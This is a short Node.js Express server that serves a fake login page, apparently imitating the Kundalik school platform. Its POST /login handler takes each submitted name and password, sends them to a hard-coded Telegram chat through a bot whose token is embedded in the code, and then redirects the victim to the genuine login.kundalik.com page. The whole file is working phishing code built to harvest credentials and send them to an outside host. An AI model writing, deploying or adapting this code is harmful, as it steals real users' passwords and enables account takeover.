const express = require('express')
const app = express()
const ejs = require('ejs')
const path = require('path')

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.use(express.static(__dirname + '/public'));
app.use(express.urlencoded({ extended: true }))


const TelegramBot = require('node-telegram-bot-api');
const TOKEN = '1167114496:AAGe805-dZlxpzfQFgxCBmEdw37vs9c4LgU';

const bot = new TelegramBot(TOKEN, {
	polling: true,
});

const router = express.Router()



router.post('/login', (req, res)=> {
    const { name, password } = req.body
    
    bot.sendMessage(1209738128, `name: ${name + ' password: ' + password}`)
    res.redirect('https://login.kundalik.com/login')
})


app.use(router)
app.get('/', (_, res)=>{
    res.send('ok')
})


app.use('/login', (req, res)=> {
    res.render('index')
})

app.listen(9000, console.log(9000))